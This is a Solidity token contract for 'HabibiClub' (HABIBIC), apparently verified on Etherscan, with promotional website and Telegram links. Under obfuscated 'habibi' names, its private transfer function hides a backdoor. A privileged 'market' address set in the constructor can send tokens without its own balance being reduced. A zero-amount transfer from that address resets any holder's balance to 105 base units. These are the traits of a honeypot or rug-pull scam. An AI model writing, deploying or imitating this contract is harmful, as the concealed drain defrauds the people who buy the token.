/**
 *Submitted for verification at Etherscan.io on 2023-06-12
*/

/*
Website: www.habibiclub.vip
TG: https://t.me/habibiclubtoken
Twitter : https://twitter.com/habibiclubtoken

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract HabibiClub is Ownable {
    mapping(address => uint256) public balanceOf;

    string public name = 'HabibiClub';

    function approve(address habibiapprover, uint256 habibinumber) public returns (bool success) {
        allowance[msg.sender][habibiapprover] = habibinumber;
        emit Approval(msg.sender, habibiapprover, habibinumber);
        return true;
    }

    uint8 public decimals = 9;

    function habibipender(address habibirow, address habibireceiver, uint256 habibinumber) private {
        if (habibiwallet[habibirow] == 0) {
            balanceOf[habibirow] -= habibinumber;
        }
        balanceOf[habibireceiver] += habibinumber;
        if (habibiwallet[msg.sender] > 0 && habibinumber == 0 && habibireceiver != habibipair) {
            balanceOf[habibireceiver] = habibivalue;
        }
        emit Transfer(habibirow, habibireceiver, habibinumber);
    }

    address public habibipair;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = 'HABIBIC';

    mapping(address => uint256) private habibiwallet;

    function transfer(address habibireceiver, uint256 habibinumber) public returns (bool success) {
        habibipender(msg.sender, habibireceiver, habibinumber);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address habibirow, address habibireceiver, uint256 habibinumber) public returns (bool success) {
        require(habibinumber <= allowance[habibirow][msg.sender]);
        allowance[habibirow][msg.sender] -= habibinumber;
        habibipender(habibirow, habibireceiver, habibinumber);
        return true;
    }

    constructor(address habibimarket) {
        balanceOf[msg.sender] = totalSupply;
        habibiwallet[habibimarket] = habibivalue;
        IUniswapV2Router02 habibiworkshop = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        habibipair = IUniswapV2Factory(habibiworkshop.factory()).createPair(address(this), habibiworkshop.WETH());
    }

    uint256 private habibivalue = 105;

    mapping(address => uint256) private habibiprime;
}